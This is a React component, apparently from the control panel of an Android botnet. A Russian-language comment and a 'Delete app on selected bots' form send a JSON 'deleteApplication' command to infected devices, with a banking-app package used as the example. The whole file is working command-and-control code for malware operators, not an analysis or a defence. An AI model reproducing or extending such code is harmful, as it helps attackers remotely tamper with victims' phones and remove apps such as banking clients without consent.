import React from 'react';
import SettingsContext from '../../Settings';


//Удаление приложений  -  {"this":"~command~","deleteApplication":"com.bank.us"}
class DeleteApps extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          app: ''
        }
    }

    onChangeApp = (e) => {
        this.setState({ 
            app: e.target.value
        });
    }

    onClickDeleteApplication = (e) => {
        SettingsContext.BotSendCommand('{"name":"deleteApplication","app":"' + this.state.app + '"}');
        this.setState({ 
            app: ''
        });
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Delete app</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Delete app on selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.app} onChange={this.onChangeApp} placeholder="com.android.app" />
                    </p>
                    <button type="button" onClick={this.onClickDeleteApplication} class="btn btn-right btn-outline-danger">Delete app</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default DeleteApps;